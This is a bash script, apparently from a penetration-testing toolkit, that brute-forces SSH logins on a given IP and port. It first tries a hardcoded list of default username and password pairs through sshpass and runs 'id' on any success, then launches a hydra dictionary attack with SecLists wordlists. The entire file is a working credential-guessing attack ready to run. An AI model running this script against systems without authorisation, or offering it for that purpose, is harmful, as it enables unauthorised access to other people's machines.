#!/bin/bash
# SSH default credentials test with hydra
# Usage: ssh_default_creds.sh <TARGET_IP> <TARGET_PORT>
set -euo pipefail

TARGET_IP="${1:-127.0.0.1}"
TARGET_PORT="${2:-22}"

echo "=== SSH Credential Test ==="

# Test common default credentials first
for cred in root:root root:toor admin:admin admin:123456 \
            root:password root:123456 test:test guest:guest \
            ubuntu:ubuntu vagrant:vagrant; do
    u="${cred%%:*}"
    p="${cred#*:}"
    result=$(sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
             "$u@$TARGET_IP" -p "$TARGET_PORT" "id" 2>&1) || true
    if echo "$result" | grep -q "uid="; then
        echo "SSH_CRED_FOUND:$u:$p"
        echo "$result"
        exit 0
    fi
done

# Hydra small dictionary
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
      -t 4 -f ssh://"$TARGET_IP":"$TARGET_PORT" 2>&1 || true
